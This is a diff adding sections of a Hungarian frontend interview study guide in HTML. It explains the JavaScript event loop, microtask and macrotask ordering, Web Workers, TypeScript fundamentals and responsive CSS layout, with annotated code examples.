+  └──────────────────────────────────────────────────────────────────┘
+
+  ┌──────────────────────────────────────────────────────────────────┐
+  │                    WEB APIs (böngésző biztosítja)                │
+  │                                                                  │
+  │  setTimeout()    fetch()    DOM Events    requestAnimationFrame  │
+  │  setInterval()   XMLHttpRequest    IntersectionObserver          │
+  │  geolocation     WebSocket         MutationObserver              │
+  │                                                                  │
+  │  → Ezek NEM a JS engine-ben futnak, hanem a böngésző C++ kódjában│
+  │  → Amikor befejeződnek, a CALLBACK-jüket a megfelelő QUEUE-ba   │
+  │    teszik                                                        │
+  └──────────────────────────────────────────────────────────────────┘
+
+  ┌──────────────────────────────────────────────────────────────────┐
+  │                        TASK QUEUES                               │
+  │                                                                  │
+  │  ┌─────────────────────────────────────────────┐                │
+  │  │  MICROTASK QUEUE (magasabb prioritás!)       │                │
+  │  │  Promise.then/catch/finally, queueMicrotask  │                │
+  │  │  MutationObserver                            │                │
+  │  └─────────────────────────────────────────────┘                │
+  │                                                                  │
+  │  ┌─────────────────────────────────────────────┐                │
+  │  │  MACROTASK QUEUE (alacsonyabb prioritás)     │                │
+  │  │  setTimeout, setInterval, setImmediate       │                │
+  │  │  I/O, UI rendering, DOM events              │                │
+  │  └─────────────────────────────────────────────┘                │
+  └──────────────────────────────────────────────────────────────────┘
+
+  ┌──────────────────────────────────────────────────────────────────┐
+  │                        EVENT LOOP                                │
+  │                                                                  │
+  │  Végtelen ciklus – ez a "szív" ami összeköti a részeket:        │
+  │                                                                  │
+  │  while (true) {                                                  │
+  │    1. Vedd ki a KÖVETKEZŐ MACROTASK-ot → futtasd (call stack)   │
+  │    2. Ürítsd ki az ÖSSZES MICROTASK-ot                          │
+  │    3. Ha kell: renderelés (requestAnimationFrame, paint)        │
+  │    4. Ismételd                                                   │
+  │  }                                                               │
+  └──────────────────────────────────────────────────────────────────┘
+*/</code></pre>
+
+<h3>18.2 Call Stack – a végrehajtás szíve</h3>
+<p>A <strong>Call Stack</strong> (hívási verem) egy <strong>LIFO (Last In, First Out)</strong> adatstruktúra, ami nyomon követi, éppen melyik függvény fut. Amikor meghívunk egy függvényt, egy új "frame" kerül a verem tetejére. Amikor a függvény return-öl (vagy befejeződik), a frame lekerül. Ha a stack üres, az event loop a következő feladatot veszi elő.</p>
+
+<pre><code>function multiply(a, b) {
+  return a * b;                // 3. ← multiply végrehajtódik, lekerül a stack-ről
+}
+
+function square(n) {
+  return multiply(n, n);       // 2. ← square meghívja multiply-t
+}
+
+function printSquare(n) {
+  const result = square(n);    // 1. ← printSquare meghívja square-t
+  console.log(result);         // 4. ← console.log a stack-re kerül, lefut, lekerül
+}
+
+printSquare(4);                // 0. ← printSquare a stack-re kerül
+
+/*
+  Call Stack állapotok sorrendben:
+
+  │                    │    │ multiply(4,4) │    │                 │    │                 │
+  │                    │    │ square(4)     │    │ square(4)       │    │                 │
+  │ square(4)          │    │ printSquare(4)│    │ printSquare(4)  │    │ console.log(16) │
+  │ printSquare(4)     │    │ (global)      │    │ (global)        │    │ printSquare(4)  │
+  │ (global)           │    │               │    │                 │    │ (global)        │
+  └────────────────────┘    └───────────────┘    └─────────────────┘    └─────────────────┘
+       step 1                    step 2               step 3                step 4
+*/</code></pre>
+
+<h3>18.3 Stack Overflow – amikor a verem "kicsordul"</h3>
+<p>Ha egy függvény végtelen rekurziót végez (soha nem éri el a base case-t), a call stack <strong>véges méretű memóriája</strong> elfogy, és <code class="inline-code">RangeError: Maximum call stack size exceeded</code> hibát kapunk. Ezt hívjuk <strong>stack overflow</strong>-nak.</p>
+
+<pre><code>// ❌ Végtelen rekurzió → stack overflow
+function forever() {
+  forever(); // soha nem áll meg
+}
+forever(); // RangeError: Maximum call stack size exceeded
+
+// A stack mérete böngészőnként változik (általában ~10.000-25.000 frame)</code></pre>
+
+<h3>18.4 Microtask vs Macrotask – a prioritás különbség</h3>
+<p>Ez a <strong>legkritikusabb</strong> koncepció az event loop-ban. Két különböző queue létezik, és a microtask queue <strong>mindig elsőbbséget élvez</strong>:</p>
+
+<ul>
+  <li><strong>Microtask queue</strong> (magas prioritás): <code>Promise.then/catch/finally</code>, <code>queueMicrotask()</code>, <code>MutationObserver</code>, <code>await</code> utáni kód</li>
+  <li><strong>Macrotask queue</strong> (normál prioritás): <code>setTimeout</code>, <code>setInterval</code>, <code>setImmediate</code> (Node.js), I/O események, DOM események (<code>click</code>, <code>scroll</code>), <code>requestAnimationFrame</code></li>
+</ul>
+
+<p><strong>A szabály:</strong> Minden egyes macrotask végrehajtása UTÁN az event loop kiüríti az <strong>ÖSSZES</strong> aktuálisan várakozó microtask-ot, mielőtt a következő macrotask-ra lépne vagy renderelne.</p>
+
+<pre><code>console.log("1 – szinkron");                          // SZINKRON
+
+setTimeout(() => console.log("2 – setTimeout"), 0);    // MACROTASK queue
+
+Promise.resolve().then(() => console.log("3 – Promise")); // MICROTASK queue
+
+queueMicrotask(() => console.log("4 – queueMicrotask")); // MICROTASK queue
+
+console.log("5 – szinkron");                          // SZINKRON
+
+// KIMENET:
+// 1 – szinkron        ← szinkron kód fut először (call stack)
+// 5 – szinkron        ← szinkron kód folytatódik
+// 3 – Promise         ← microtask queue (elsőbbség!)
+// 4 – queueMicrotask  ← microtask queue (elsőbbség!)
+// 2 – setTimeout      ← macrotask queue (utolsó)</code></pre>
+
+<h3>18.5 Komplex példa – lépésről lépésre</h3>
+<pre><code>console.log("start");
+
+setTimeout(() => {
+  console.log("timeout 1");
+  Promise.resolve().then(() => console.log("promise inside timeout"));
+}, 0);
+
+Promise.resolve()
+  .then(() => {
+    console.log("promise 1");
+    setTimeout(() => console.log("timeout inside promise"), 0);
+  })
+  .then(() => console.log("promise 2"));
+
+setTimeout(() => console.log("timeout 2"), 0);
+
+console.log("end");
+
+/*
+  KIMENET:
+
+  "start"                    ← szinkron
+  "end"                      ← szinkron
+  ─── call stack üres → microtask queue kiürítése ───
+  "promise 1"                ← microtask (.then #1)
+  "promise 2"                ← microtask (.then #2 – láncolva)
+  ─── microtask queue üres → következő macrotask ───
+  "timeout 1"                ← macrotask (setTimeout #1)
+  ─── macrotask után → microtask queue kiürítése ───
+  "promise inside timeout"   ← microtask (promise a timeout-ból)
+  ─── microtask queue üres → következő macrotask ───
+  "timeout 2"                ← macrotask (setTimeout #2)
+  ─── következő macrotask ───
+  "timeout inside promise"   ← macrotask (setTimeout a promise-ból)
+*/</code></pre>
+
+<h3>18.6 Az Event Loop lépései – részletes algoritmus</h3>
+<pre><code>/*
+  Az Event Loop PONTOS végrehajtási sorrendje egy ciklusban:
+
+  ┌─────────────────────────────────────────────────────┐
+  │  1. MACROTASK végrehajtása                          │
+  │     (a legrégebbi task a macrotask queue-ból)        │
+  │     Ha a queue üres → várj, amíg lesz task          │
+  └────────────────────────┬────────────────────────────┘
+                           ↓
+  ┌─────────────────────────────────────────────────────┐
+  │  2. MICROTASK QUEUE kiürítése (ÖSSZES!)             │
+  │     - Promise callback-ek                            │
+  │     - queueMicrotask callback-ek                     │
+  │     - MutationObserver callback-ek                   │
+  │                                                      │
+  │     ⚠️  Ha egy microtask újabb microtask-ot hoz      │
+  │     létre, az is MOST fut le (nem a következő        │
+  │     ciklusban!) → vigyázz, végtelen microtask        │
+  │     loop lefagyasztja az oldalt!                      │
+  └────────────────────────┬────────────────────────────┘
+                           ↓
+  ┌─────────────────────────────────────────────────────┐
+  │  3. RENDERING (ha szükséges – ~60fps, 16.6ms)      │
+  │     a) requestAnimationFrame callback-ek            │
+  │     b) Style kiszámítás (CSS)                       │
+  │     c) Layout (elemek mérete, pozíciója)            │
+  │     d) Paint (pixelek kirajzolása)                  │
+  │     e) Composite (rétegek összeállítása)            │
+  │                                                      │
+  │     A böngésző eldöntheti, hogy kihagyja a           │
+  │     renderelést, ha nincs vizuális változás.          │
+  └────────────────────────┬────────────────────────────┘
+                           ↓
+              Vissza az 1. lépéshez (végtelen ciklus)
+*/</code></pre>
+
+<h3>18.7 setTimeout(fn, 0) – valóban 0ms?</h3>
+<p>A <code class="inline-code">setTimeout(fn, 0)</code> <strong>nem jelent azonnali végrehajtást</strong>. Csak annyit garantál, hogy a callback a <strong>macrotask queue-ba</strong> kerül, és legkorábban a jelenlegi szinkron kód és az összes microtask lefutása UTÁN hajtódik végre. Ráadásul a böngészők <strong>minimum 4ms késleltetést</strong> alkalmaznak, ha a setTimeout egymásba van ágyazva (5+ mélység után).</p>
+
+<pre><code>const start = performance.now();
+
+setTimeout(() => {
+  const elapsed = performance.now() - start;
+  console.log(`Eltelt idő: ${elapsed}ms`);
+  // Általában 1-5ms – NEM 0ms!
+}, 0);
+
+// Ha a szinkron kód sokáig fut, a timeout MÉG KÉSŐBB hajtódik végre:
+for (let i = 0; i < 1_000_000_000; i++) {} // ~1 sec blokkolás
+// A setTimeout callback EZUTÁN fut le – akár 1+ sec késéssel!</code></pre>
+
+<h3>18.8 async/await és az Event Loop</h3>
+<p>Az <code class="inline-code">async/await</code> szintaktikus cukor a Promise-ok felett. Az <code>await</code> kulcsszó <strong>felfüggeszti a függvény végrehajtását</strong> és a folytatást (az await utáni kódot) egy <strong>microtask</strong>-ként ütemezi. A függvény előtti rész szinkronban fut.</p>
+
+<pre><code>async function example() {
+  console.log("A – szinkron (await ELŐTT)");
+
+  await Promise.resolve();
+  // ↑ Innentől minden microtask-ként fut
+
+  console.log("B – microtask (await UTÁN)");
+}
+
+console.log("1");
+example();
+console.log("2");
+
+// KIMENET:
+// "1"    ← szinkron
+// "A"    ← az async fn szinkron része (await előtti kód)
+// "2"    ← szinkron (a hívó kód folytatódik!)
+// "B"    ← microtask (az await utáni kód)
+
+// Lényeg: az await "elválasztja" a függvényt:
+// - await ELŐTTI rész: szinkron (azonnal a call stack-en)
+// - await UTÁNI rész: microtask (a microtask queue-ba kerül)</code></pre>
+
+<h3>18.9 requestAnimationFrame – a rendering queue</h3>
+<p>A <code class="inline-code">requestAnimationFrame</code> (rAF) egy speciális ütemezés: a callback a <strong>következő renderelési ciklus előtt</strong> fut le (a microtask-ok után, de a paint előtt). Animációkhoz és DOM méréséhez ideális, mert garantálja, hogy a böngésző "kész" a vizuális frissítésre.</p>
+
+<pre><code>// A végrehajtási sorrend EGY event loop ciklusban:
+// 1. Macrotask
+// 2. Microtask-ok (MIND)
+// 3. requestAnimationFrame callback-ek
+// 4. Rendering (style → layout → paint → composite)
+// 5. Következő macrotask...
+
+console.log("1 – szinkron");
+
+requestAnimationFrame(() => console.log("2 – rAF"));
+
+Promise.resolve().then(() => console.log("3 – microtask"));
+
+setTimeout(() => console.log("4 – macrotask"), 0);
+
+// TIPIKUS kimenet:
+// "1 – szinkron"
+// "3 – microtask"
+// "2 – rAF"         ← a renderelés előtt
+// "4 – macrotask"   ← a következő event loop ciklusban
+
+// ⚠️ A rAF és a setTimeout(0) sorrendje NEM garantált
+// a böngészők között! De a microtask MINDIG a rAF előtt fut.
+
+// Animáció requestAnimationFrame-mel:
+function animate(timestamp) {
+  element.style.transform = `translateX(${timestamp / 10}px)`;
+
+  if (timestamp < 2000) {
+    requestAnimationFrame(animate); // Következő frame-re ütemez
+  }
+}
+requestAnimationFrame(animate);</code></pre>
+
+<h3>18.10 Végtelen microtask loop – az oldal lefagyása</h3>
+<p>Mivel az event loop az <strong>ÖSSZES</strong> microtask-ot kiüríti, mielőtt továbbmenne, egy végtelen microtask sorozat <strong>örökre blokkolja</strong> az event loop-ot – a böngésző nem tud renderelni, nem tud macrotask-okat feldolgozni, az oldal teljesen lefagy. Ez rosszabb, mint egy végtelen szinkron ciklus, mert a böngésző "nem is érti", hogy mi történik.</p>
+
+<pre><code>// ❌ VESZÉLYES – végtelen microtask loop → az oldal örökre lefagy!
+function infiniteMicrotask() {
+  Promise.resolve().then(infiniteMicrotask);
+}
+infiniteMicrotask();
+// A böngésző SOHA nem jut el a renderelésig vagy a setTimeout callback-ekig!
+
+// ❌ Ez is veszélyes:
+async function infiniteAwait() {
+  while (true) {
+    await Promise.resolve(); // Minden await egy microtask – de sosem jut a render-ig!
+  }
+}
+
+// ✅ Ha szüneteltetni kell a nehéz munkát, setTimeout-ot használj:
+function yieldToEventLoop() {
+  return new Promise(resolve => setTimeout(resolve, 0));
+  // A setTimeout MACROTASK → megengedi a renderelést és az I/O-t
+}
+
+async function heavyWork(items) {
+  for (let i = 0; i < items.length; i++) {
+    processItem(items[i]);
+    if (i % 100 === 0) {
+      await yieldToEventLoop(); // Minden 100. elemnél "levegőt vesz"
+    }
+  }
+}</code></pre>
+
+<h3>18.11 Interjú klasszikus: a végrehajtási sorrend feladat</h3>
+<pre><code>// "Mi a kimenet?" – klasszikus interjúkérdés
+console.log("1");
+
+setTimeout(() => console.log("2"), 0);
+
+Promise.resolve()
+  .then(() => console.log("3"))
+  .then(() => console.log("4"));
+
+requestAnimationFrame(() => console.log("5"));
+
+queueMicrotask(() => console.log("6"));
+
+console.log("7");
+
+/*
+  MEGOLDÁS – lépésről lépésre:
+
+  ── SZINKRON KÓD (call stack) ──
+  "1"     ← console.log("1") – szinkron, azonnal
+  "7"     ← console.log("7") – szinkron, azonnal
+          (a setTimeout, Promise.then, rAF, queueMicrotask regisztrálva)
+
+  ── CALL STACK ÜRES → MICROTASK QUEUE KIÜRÍTÉSE ──
+  "3"     ← Promise.then #1 – microtask
+  "6"     ← queueMicrotask – microtask
+  "4"     ← Promise.then #2 – microtask (az előző .then által generált)
+
+  ── MICROTASK QUEUE ÜRES → RENDERING ──
+  "5"     ← requestAnimationFrame – rendering fázis előtt
+
+  ── RENDERING → KÖVETKEZŐ MACROTASK ──
+  "2"     ← setTimeout – macrotask
+
+  VÉGEREDMÉNY: 1, 7, 3, 6, 4, 5, 2
+*/</code></pre>
+
+<h3>18.12 Web Workers – valódi párhuzamosság</h3>
+<p>Az event loop egyetlen szálon fut, tehát a nehéz CPU-műveleteket <strong>nem tudja valóban párhuzamosan</strong> végezni – csak "ütemezni" tudja őket. Ha valódi párhuzamos végrehajtásra van szükség (kép/videó feldolgozás, titkosítás, nagy adathalmaz rendezése), <strong>Web Worker</strong>-t használhatunk. A Worker egy <strong>külön szálon</strong> fut, saját event loop-pal, és <code class="inline-code">postMessage</code>-en keresztül kommunikál a fő szállal.</p>
+
+<pre><code>// ═══ main.js (fő szál) ═══
+const worker = new Worker("worker.js");
+
+// Üzenet küldése a Worker-nek
+worker.postMessage({ data: hugeArray, operation: "sort" });
+
+// Válasz fogadása a Worker-től
+worker.onmessage = (event) => {
+  console.log("Rendezett eredmény:", event.data);
+  // A fő szál NEM volt blokkolva a rendezés alatt!
+};
+
+worker.onerror = (error) => {
+  console.error("Worker hiba:", error);
+};
+
+// ═══ worker.js (külön szál) ═══
+self.onmessage = (event) => {
+  const { data, operation } = event.data;
+
+  if (operation === "sort") {
+    const sorted = data.sort((a, b) => a - b); // Nehéz művelet – de külön szálon!
+    self.postMessage(sorted);
+  }
+};
+
+// ⚠️ Worker korlátozások:
+// - NEM fér hozzá a DOM-hoz (document, window)
+// - NEM fér hozzá a fő szál változóihoz
+// - Kommunikáció CSAK postMessage-en keresztül (strukturált klónozás)
+// - Saját globális scope: "self" (nem "window")</code></pre>
+
+<div class="note">
+  <strong>Event Loop összefoglalás – interjúra:</strong>
+  <ul>
+    <li>A JS <strong>single-threaded</strong>, de az event loop és a Web API-k segítségével aszinkron viselkedést mutat</li>
+    <li><strong>Call Stack</strong>: LIFO verem, a szinkron kód végrehajtási sorrendje</li>
+    <li><strong>Microtask</strong> (Promise, queueMicrotask, await utáni kód) <strong>MINDIG előbb fut</strong> mint a macrotask</li>
+    <li><strong>Macrotask</strong> (setTimeout, setInterval, DOM events): egyszerre egy, utána microtask-ok kiürítése</li>
+    <li><strong>requestAnimationFrame</strong>: a rendering fázis előtt fut, de a microtask-ok után</li>
+    <li><strong>setTimeout(fn, 0) ≠ azonnali</strong>: macrotask queue-ba kerül, minimum ~4ms késéssel</li>
+    <li><strong>Végtelen microtask loop</strong> lefagyasztja az oldalt (rosszabb mint végtelen szinkron ciklus)</li>
+    <li>Valódi párhuzamossághoz → <strong>Web Worker</strong> (külön szál, postMessage kommunikáció)</li>
+  </ul>
+</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- 19. TYPESCRIPT ALAPOK -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="section" id="q19">
+<h2>19. TypeScript alapok</h2>
+<span class="tag">TypeScript</span> <span class="tag">JS alapok</span>
+
+<p>A <strong>TypeScript</strong> a JavaScript <strong>statikusan típusos</strong> felülrétege (superset): minden valid JS egyben valid TS is, de a TS <strong>fordítási időben</strong> (compile-time) ellenőrzi a típusokat. A böngésző nem érti közvetlenül – a <code class="inline-code">tsc</code> (vagy esbuild/swc/Babel) <strong>lefordítja sima JavaScriptté</strong>. A típusok futásidőben (runtime) eltűnnek – ezt hívják <strong>type erasure</strong>-nek. Az interjún a "React main technology" mellett a JS/TS fundamentumok is előjöhetnek.</p>
+
+<h3>19.1 type vs interface</h3>
+<p>Kétféleképpen definiálhatunk objektum-alakzatot. Az <code class="inline-code">interface</code> kibővíthető (declaration merging, <code>extends</code>), a <code class="inline-code">type</code> rugalmasabb (union, intersection, mapped/conditional types). Ökölszabály: objektum/komponens props → bármelyik (ízlés), union/segédtípus → <code>type</code>.</p>
+<pre><code>// interface – kibővíthető, "extends"
+interface User {
+  id: number;
+  name: string;
+  email?: string;            // opcionális property
+  readonly createdAt: Date;  // csak olvasható
+}
+
+interface Admin extends User {
+  role: "admin";
+}
+
+// type alias – union, intersection, primitívek
+type ID = number | string;             // union
+type Point = { x: number; y: number };
+type Point3D = Point &amp; { z: number };  // intersection
+
+// Declaration merging – CSAK interface-nél működik:
+interface Window { myGlobal: string; } // hozzáfűzi a meglévő Window-hoz</code></pre>
+
+<h3>19.2 Union, literal types és type narrowing</h3>
+<p>A <strong>union</strong> (<code>A | B</code>) "vagy" típus. A <strong>literal type</strong> konkrét értékre szűkít. A <strong>type narrowing</strong>: a fordító a kódág alapján leszűkíti a típust (<code>typeof</code>, <code>in</code>, <code>instanceof</code>, vagy discriminated union).</p>
+<pre><code>type Status = "idle" | "loading" | "success" | "error"; // literal union
+
+function handle(value: string | number) {
+  if (typeof value === "string") {
+    value.toUpperCase();  // itt a fordító tudja: string
+  } else {
+    value.toFixed(2);     // itt: number
+  }
+}
+
+// Discriminated union – a "kind" mező alapján szűkít
+type Shape =
+  | { kind: "circle"; radius: number }
+  | { kind: "square"; side: number };
+
+function area(s: Shape): number {
+  switch (s.kind) {
+    case "circle": return Math.PI * s.radius ** 2;
+    case "square": return s.side ** 2;
+  }
+}</code></pre>
+
+<h3>19.3 Generics</h3>
+<p>A generics típus-paraméterezést tesz lehetővé: a típus "változó", amit a használat helyén töltünk ki. Így újrahasználható, típusbiztos kód írható.</p>
+<pre><code>// Generikus függvény
+function identity&lt;T&gt;(value: T): T {
+  return value;
+}
+identity&lt;string&gt;("hello"); // T = string
+identity(42);              // T = number (inferált)
+
+// Generikus megkötéssel (constraint)
+function getLength&lt;T extends { length: number }&gt;(item: T): number {
+  return item.length;
+}
+getLength("abc");   // ok (string-nek van length)
+getLength([1, 2]);  // ok (tömbnek van length)
+// getLength(42);   // ❌ number-nek nincs length
+
+// Generikus interface
+interface ApiResponse&lt;T&gt; {
+  data: T;
+  status: number;
+}
+const res: ApiResponse&lt;User[]&gt; = { data: [], status: 200 };</code></pre>
+
+<h3>19.4 Utility types</h3>
+<p>A TS beépített segédtípusai gyakori transzformációkat adnak meglévő típusokon.</p>
+<pre><code>interface User { id: number; name: string; email: string; }
+
+Partial&lt;User&gt;            // minden mező opcionális → { id?, name?, email? }
+Required&lt;User&gt;           // minden mező kötelező
+Readonly&lt;User&gt;           // minden mező readonly
+Pick&lt;User, "id" | "name"&gt; // csak a kiválasztott mezők
+Omit&lt;User, "email"&gt;      // a megadott mező KIVÉTELÉVEL
+Record&lt;string, number&gt;   // { [kulcs: string]: number }
+ReturnType&lt;typeof fn&gt;    // egy függvény visszatérési típusa
+Parameters&lt;typeof fn&gt;    // egy függvény paramétereinek típusa (tuple)
+Awaited&lt;Promise&lt;User&gt;&gt;    // a Promise feloldott típusa → User</code></pre>
+
+<h3>19.5 any vs unknown vs never</h3>
+<table>
+  <tr><th>Típus</th><th>Jelentés</th><th>Mikor?</th></tr>
+  <tr><td><code>any</code></td><td>Kikapcsolja a típusellenőrzést – bármit lehet vele csinálni</td><td>KERÜLENDŐ (elveszik a típusbiztonság)</td></tr>
+  <tr><td><code>unknown</code></td><td>"Típusbiztos any" – előbb szűkíteni kell, mielőtt használnád</td><td>Ismeretlen input (API válasz, <code>JSON.parse</code>)</td></tr>
+  <tr><td><code>never</code></td><td>Soha nem fordul elő érték (mindig dobó fn, kimerített union)</td><td>Exhaustiveness check</td></tr>
+</table>
+<pre><code>let a: any = 5;
+a.foo.bar;          // ❌ nincs hiba fordításnál (de runtime crash!)
+
+let u: unknown = JSON.parse(input);
+// u.toUpperCase(); // ❌ fordítási hiba – előbb szűkíteni kell!
+if (typeof u === "string") u.toUpperCase(); // ✅
+
+// never – exhaustiveness check (minden eset le van fedve?)
+function assertNever(x: never): never {
+  throw new Error("Nem várt érték: " + x);
+}</code></pre>
+
+<h3>19.6 React + TypeScript</h3>
+<pre><code>// Props típusozása
+type ButtonProps = {
+  label: string;
+  variant?: "primary" | "secondary";   // opcionális literal union
+  onClick: (e: React.MouseEvent&lt;HTMLButtonElement&gt;) =&gt; void;
+  children?: React.ReactNode;            // bármi, amit a React renderelni tud
+};
+
+function Button({ label, variant = "primary", onClick }: ButtonProps) {
+  return &lt;button className={variant} onClick={onClick}&gt;{label}&lt;/button&gt;;
+}
+
+// useState – inferált vagy explicit
+const [count, setCount] = useState(0);               // number (inferált)
+const [user, setUser] = useState&lt;User | null&gt;(null); // explicit, mert null
+
+// useRef
+const inputRef = useRef&lt;HTMLInputElement&gt;(null);
+
+// Event típusok
+function onChange(e: React.ChangeEvent&lt;HTMLInputElement&gt;) {
+  console.log(e.target.value);
+}</code></pre>
+
+<div class="note">
+  <strong>Interjú tipp:</strong> Leggyakoribb kérdések: <code>type</code> vs <code>interface</code>, <code>any</code> vs <code>unknown</code> (mindig az <code>unknown</code> a biztonságos!), a generics célja, és a utility típusok (<code>Partial</code>, <code>Pick</code>, <code>Omit</code>, <code>Record</code>). Fontos kimondani: a TS típusok <strong>fordítási időben</strong> léteznek, runtime-ban eltűnnek (type erasure) – ezért futásidejű validációhoz külön eszköz kell (pl. <code>zod</code>).
+</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- 20. RESPONSIVE WEB DESIGN -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="section" id="q20">
+<h2>20. Responsive web design &amp; layout</h2>
+<span class="tag">CSS</span> <span class="tag">Web design</span>
+
+<p>A <strong>responsive web design</strong> azt jelenti, hogy az oldal <strong>egyetlen kódbázissal</strong> alkalmazkodik a különböző képernyőméretekhez (mobil, tablet, desktop). Három fő eszköze: <strong>fluid layout</strong> (rugalmas, %/fr alapú méretek), <strong>media queries</strong> (töréspontok) és <strong>responsive images</strong>. A modern megközelítés a <strong>mobile-first</strong>: előbb a mobil nézetre tervezünk, majd <code class="inline-code">min-width</code> media query-kkel bővítünk nagyobb képernyőkre.</p>
+
+<h3>20.1 Mobile-first media queries</h3>
+<pre><code>/* Alap (mobil) stílus – ez a "default" */
+.container { padding: 1rem; }
+.grid { display: grid; grid-template-columns: 1fr; } /* 1 oszlop mobilon */
+
+/* Tablet és felfelé (min-width = mobile-first) */
+@media (min-width: 768px) {
+  .grid { grid-template-columns: repeat(2, 1fr); } /* 2 oszlop */
+}
+
+/* Desktop és felfelé */
+@media (min-width: 1024px) {
+  .container { padding: 2rem; }
+  .grid { grid-template-columns: repeat(3, 1fr); } /* 3 oszlop */
+}
+
+/* Egyéb hasznos media feature-ök: */
+@media (prefers-color-scheme: dark) { /* sötét mód */ }
+@media (prefers-reduced-motion: reduce) { /* animációk kikapcsolása */ }
+@media (orientation: landscape) { /* fekvő tájolás */ }</code></pre>
+
+<h3>20.2 Flexbox vs Grid – mikor melyik?</h3>
+<table>
+  <tr><th>Szempont</th><th>Flexbox</th><th>Grid</th></tr>
+  <tr><td>Dimenzió</td><td><strong>Egy</strong> (sor VAGY oszlop)</td><td><strong>Kettő</strong> (sor ÉS oszlop egyszerre)</td></tr>
+  <tr><td>Tipikus használat</td><td>Komponensen belül (navbar, gomb-sor, kártya belső)</td><td>Oldal-layout, rács, galéria</td></tr>
+  <tr><td>Megközelítés</td><td>Content-first (a tartalom mérete vezérel)</td><td>Layout-first (a rácsot előre definiálod)</td></tr>
+</table>
+<pre><code>/* FLEXBOX – egy dimenzió (pl. navbar) */
+.navbar {
+  display: flex;
+  justify-content: space-between; /* fő tengely */
+  align-items: center;            /* kereszt tengely */
+  gap: 1rem;
+  flex-wrap: wrap;                /* tördelés kis képernyőn */
+}
+
+/* GRID – két dimenzió (pl. responsive kártya-rács) */
+.cards {
+  display: grid;
+  /* Automatikusan annyi oszlop, amennyi elfér – media query NÉLKÜL! */
+  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+  gap: 1.5rem;
+}</code></pre>
+
+<h3>20.3 CSS mértékegységek</h3>
+<table>
+  <tr><th>Egység</th><th>Mihez viszonyít?</th><th>Tipikus használat</th></tr>
+  <tr><td><code>px</code></td><td>Abszolút pixel</td><td>Border, kis fix méretek</td></tr>
+  <tr><td><code>rem</code></td><td>A <code>&lt;html&gt;</code> font-size-a (alapból 16px)</td><td>Font-size, spacing (skálázható!)</td></tr>
+  <tr><td><code>em</code></td><td>A SZÜLŐ font-size-a</td><td>Komponensen belüli relatív méret</td></tr>
+  <tr><td><code>%</code></td><td>A szülő mérete</td><td>Szélesség, fluid layout</td></tr>
+  <tr><td><code>vw</code> / <code>vh</code></td><td>A viewport szélesség / magasság 1%-a</td><td>Full-screen szekciók, hero</td></tr>
+  <tr><td><code>ch</code></td><td>A "0" karakter szélessége</td><td>Olvasható sorhossz (<code>max-width: 65ch</code>)</td></tr>
+</table>
+<pre><code>/* clamp() – fluid méret min/max korláttal (media query nélkül!) */
+h1 {
+  /* min 1.5rem, ideálisan 5vw, max 3rem */
+  font-size: clamp(1.5rem, 5vw, 3rem);
+}
+
+/* min() / max() */
+.container {
+  width: min(90%, 1200px); /* a kettő közül a kisebb érték */
+}</code></pre>
+
+<h3>20.4 Responsive images</h3>
+<pre><code>&lt;!-- srcset + sizes: a böngésző választja a megfelelő méretet --&gt;
+&lt;img
+  src="photo-800.jpg"
+  srcset="photo-400.jpg 400w, photo-800.jpg 800w, photo-1200.jpg 1200w"
+  sizes="(max-width: 600px) 100vw, 50vw"
+  alt="Leírás"
+  loading="lazy"
+/&gt;
+
+&lt;!-- &lt;picture&gt;: art direction VAGY modern formátum (WebP/AVIF) fallbackkel --&gt;
+&lt;picture&gt;
+  &lt;source srcset="hero.avif" type="image/avif" /&gt;
+  &lt;source srcset="hero.webp" type="image/webp" /&gt;
+  &lt;img src="hero.jpg" alt="Hero" /&gt;
+&lt;/picture&gt;</code></pre>
+
+<h3>20.5 Container queries (modern)</h3>
+<p>A media query a <strong>viewport</strong> méretére reagál. A <strong>container query</strong> (2023 óta minden modern böngészőben) viszont a <strong>szülő konténer</strong> méretére – így egy komponens újrahasználható bárhol, és önállóan alkalmazkodik a rendelkezésre álló helyhez.</p>
+<pre><code>/* A konténert "query container"-ré tesszük */
+.card-wrapper {
+  container-type: inline-size;
+}
+
+/* A kártya a SZÜLŐ szélességére reagál, nem a viewportra! */
+@container (min-width: 400px) {
+  .card { display: flex; gap: 1rem; }
+}</code></pre>
+
+<div class="note">
+  <strong>Interjú tipp:</strong> A leggyakoribb kérdés a <strong>Flexbox vs Grid</strong> (1D vs 2D) és a <strong>mobile-first</strong> megközelítés (<code>min-width</code> media query). Emeld ki a <code>rem</code> előnyét a <code>px</code>-szel szemben (akadálymentesség: a felhasználó böngésző-font-mérete skálázza), a <code>clamp()</code>-ot a fluid tipográfiához, és a <code>container query</code>-t mint a modern, komponens-alapú responsive design eszközét.
+</div>
+</div>
+
+  <footer>
+    Nagarro – Frontend interjú felkészülési segédlet · 20 témakör · Frissítve: 2026-06-21<br>
+    Minden kódrészlet futtatható példa. A táblázatok és „Interjú tipp” dobozok a leggyakoribb follow-up kérdésekre készítenek fel.
+  </footer>
+
+</div>
+</body>
+</html>
